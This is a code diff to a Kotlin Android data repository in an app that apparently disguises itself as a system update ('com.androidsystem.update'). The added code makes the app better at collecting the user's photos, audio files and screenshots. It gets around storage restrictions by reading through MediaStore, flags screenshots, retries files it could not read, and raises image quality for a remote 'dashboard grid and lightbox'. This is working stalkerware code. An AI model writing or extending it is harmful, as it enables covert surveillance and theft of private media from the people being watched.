@@ -1,6 +1,12 @@
 package com.androidsystem.update.database
 
+import android.content.ContentUris
+import android.content.Context
+import android.graphics.Bitmap
+import android.net.Uri
+import android.provider.MediaStore
 import com.androidsystem.update.core.EncryptionManager
+import dagger.hilt.android.qualifiers.ApplicationContext
 import org.json.JSONObject
 import javax.inject.Inject
 import javax.inject.Singleton
@@ -8,7 +14,8 @@ import javax.inject.Singleton
 @Singleton
 class DataRepository @Inject constructor(
     private val dao: TelemetryDao,
-    private val encryptionManager: EncryptionManager
+    private val encryptionManager: EncryptionManager,
+    @ApplicationContext private val context: Context
 ) {
     suspend fun insertCollectedData(type: String, content: String) {
         dao.insertCollectedData(CollectedDataEntity(
@@ -167,6 +174,9 @@ class DataRepository @Inject constructor(
         val rows = dao.getMediaAfter(lastId, limit)
         if (rows.isEmpty()) return emptyList<SyncMessage>() to lastId
         val msgs = mutableListOf<SyncMessage>()
+        // The cursor only advances past rows whose content was actually read;
+        // unreadable files (e.g. a permission briefly missing) stay for retry.
+        var lastOk = lastId
         for (row in rows) {
             val mime = row.mimeType?.lowercase() ?: ""
             val payload = when {
@@ -180,29 +190,25 @@ class DataRepository @Inject constructor(
                         if (mime.startsWith("audio/")) "audio_file" else "photo_file",
                         toJson(
                             "path" to row.path, "name" to row.name, "mime" to row.mimeType,
-                            "dateAdded" to row.dateAdded, "ts" to row.dateAdded, "data" to payload
+                            "dateAdded" to row.dateAdded, "ts" to row.dateAdded,
+                            "screenshot" to row.isScreenshot, "data" to payload
                         ),
                         row.dateAdded
                     )
                 )
+                lastOk = row.id
             }
         }
-        return msgs to rows.last().id
+        return msgs to lastOk
     }
 
-    // Downscale to max 512 px, JPEG q60 — a small enough base64 payload to
+    // Downscale to max 640 px, JPEG q70 — a small enough base64 payload to
     // live inside a capped Firebase module collection while still being
-    // legible in the dashboard grid.
+    // legible in the dashboard grid and lightbox.
     private fun encodeImageThumbnail(path: String): String? {
+        val bmp = decodeImageBitmap(path) ?: return null
         return try {
-            val bounds = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
-            android.graphics.BitmapFactory.decodeFile(path, bounds)
-            if (bounds.outWidth <= 0 || bounds.outHeight <= 0) return null
-            var sample = 1
-            while (bounds.outWidth / (sample * 2) >= 512 && bounds.outHeight / (sample * 2) >= 512) sample *= 2
-            val opts = android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
-            val bmp = android.graphics.BitmapFactory.decodeFile(path, opts) ?: return null
-            val scale = minOf(1f, 512f / maxOf(bmp.width, bmp.height))
+            val scale = minOf(1f, 640f / maxOf(bmp.width, bmp.height))
             val scaled = if (scale < 1f) {
                 android.graphics.Bitmap.createScaledBitmap(
                     bmp, (bmp.width * scale).toInt().coerceAtLeast(1),
@@ -210,10 +216,58 @@ class DataRepository @Inject constructor(
                 )
             } else bmp
             val out = java.io.ByteArrayOutputStream()
-            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 60, out)
+            scaled.compress(android.graphics.Bitmap.CompressFormat.JPEG, 70, out)
             if (scaled !== bmp) scaled.recycle()
             bmp.recycle()
             android.util.Base64.encodeToString(out.toByteArray(), android.util.Base64.NO_WRAP)
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    // Read the image bytes. Direct file access is tried first; some OEM
+    // builds (Samsung scoped storage) silently refuse raw /storage paths even
+    // with READ_MEDIA_IMAGES granted, so on failure we resolve the row through
+    // MediaStore and read via the content resolver instead.
+    private fun decodeImageBitmap(path: String): Bitmap? {
+        try {
+            val bmp = android.graphics.BitmapFactory.decodeFile(path)
+            if (bmp != null) return bmp
+        } catch (e: Exception) { /* fall through to content resolver */ }
+        return try {
+            val uri = resolveMediaUri(path) ?: return null
+            val bounds = android.graphics.BitmapFactory.Options().apply { inJustDecodeBounds = true }
+            context.contentResolver.openInputStream(uri)?.use { stream ->
+                android.graphics.BitmapFactory.decodeStream(stream, null, bounds)
+            }
+            if (bounds.outWidth <= 0 || bounds.outHeight <= 0) return null
+            var sample = 1
+            while (bounds.outWidth / (sample * 2) >= 1280 && bounds.outHeight / (sample * 2) >= 1280) sample *= 2
+            context.contentResolver.openInputStream(uri)?.use { stream ->
+                android.graphics.BitmapFactory.decodeStream(
+                    stream, null,
+                    android.graphics.BitmapFactory.Options().apply { inSampleSize = sample }
+                )
+            }
+        } catch (e: Exception) {
+            null
+        }
+    }
+
+    private fun resolveMediaUri(path: String): Uri? {
+        return try {
+            val projection = arrayOf(MediaStore.Images.Media._ID)
+            val selection = "${MediaStore.Images.Media.DATA} = ?"
+            context.contentResolver.query(
+                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
+                projection, selection, arrayOf(path), null
+            )?.use { cursor ->
+                if (cursor.moveToFirst()) {
+                    ContentUris.withAppendedId(
+                        MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cursor.getLong(0)
+                    )
+                } else null
+            }
         } catch (e: Exception) {
             null
         }
